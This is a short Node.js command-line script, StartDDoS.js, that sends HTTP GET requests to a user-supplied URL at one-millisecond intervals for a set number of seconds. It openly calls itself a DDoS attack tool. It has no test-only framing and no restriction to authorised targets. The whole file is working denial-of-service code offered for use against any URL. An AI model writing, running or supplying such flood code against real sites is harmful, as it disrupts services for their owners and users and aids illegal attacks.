#!/usr/bin/env node

const http = require('http');
const url = require('url');

function startDDoS(targetUrl, duration) {
    const parsedUrl = url.parse(targetUrl);
    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || 80,
        path: parsedUrl.path || '/',
        method: 'GET'
    };

    const startTime = Date.now();
    const interval = 1; // Interval in milliseconds

    function sendRequest() {
        const req = http.request(options, (res) => {
            res.on('data', (d) => {
                // Process response data if needed
            });
        });

        req.on('error', (e) => {
            console.error(`Problem with request: ${e.message}`);
        });

        req.end();
    }

    const requestInterval = setInterval(sendRequest, interval);

    setTimeout(() => {
        clearInterval(requestInterval);
        console.log(`DDoS attack stopped after ${duration} seconds.`);
    }, duration * 1000);
}

const args = process.argv.slice(2);
if (args.length !== 2) {
    console.log('Usage: StartDDoS.js [URL] [DURATION]');
    process.exit(1);
}

const targetUrl = args[0];
const duration = parseInt(args[1], 10);

if (isNaN(duration) || duration <= 0) {
    console.log('Duration must be a positive number.');
    process.exit(1);
}

startDDoS(targetUrl, duration);